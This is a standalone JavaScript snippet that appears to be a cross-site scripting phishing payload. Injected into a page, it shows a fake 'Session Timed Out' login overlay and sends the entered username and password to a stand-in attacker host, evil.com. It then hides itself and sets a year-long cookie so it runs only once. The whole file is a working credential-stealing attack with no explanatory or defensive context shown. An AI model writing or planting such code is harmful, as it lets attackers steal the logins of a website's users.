if (document.cookie.indexOf('runonce=true') === -1) {
  var html = `
    <div id="bg" style="
      position: fixed;
      z-index: 9999;
      width: 100vw;
      height: 100vh;
      background-color: rgba(0, 0, 0, 0.5);
      top: 0;
      left: 0;"></div>

    <div id="form" style="
      position: fixed;
      z-index: 10000;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0,0,0,0.2);
      padding: 20px;
      width: 320px;
      text-align: center;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      animation: fadeIn 0.5s;">
      <h3 style="color:#333;">Session Timed Out</h3>
      <p style="color:#555;">Please re-enter your credentials.</p>
      <form id="LogginForm">
        <input type="text" name="username" placeholder="Username" style="width:90%; padding:10px; margin:5px 0; border:1px solid #ccc; border-radius:4px;">
        <input type="password" name="password" placeholder="Password" style="width:90%; padding:10px; margin:5px 0; border:1px solid #ccc; border-radius:4px;">
        <input type="submit" value="Login" style="padding:10px 20px; background-color:#4CAF50; color:white; border:none; border-radius:4px; cursor:pointer;">
      </form>
    </div>`;

  document.body.insertAdjacentHTML('beforeend', html);

  document.querySelector('#LogginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var formData = new FormData(this);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://evil.com/getdata.php', true);
    xhr.send(formData);

    document.getElementById('bg').remove();
    document.getElementById('form').remove();

    var expire = new Date();
    expire.setFullYear(expire.getFullYear() + 1);
    document.cookie = "runonce=true; path=/; expires=" + expire.toUTCString();
  });
}
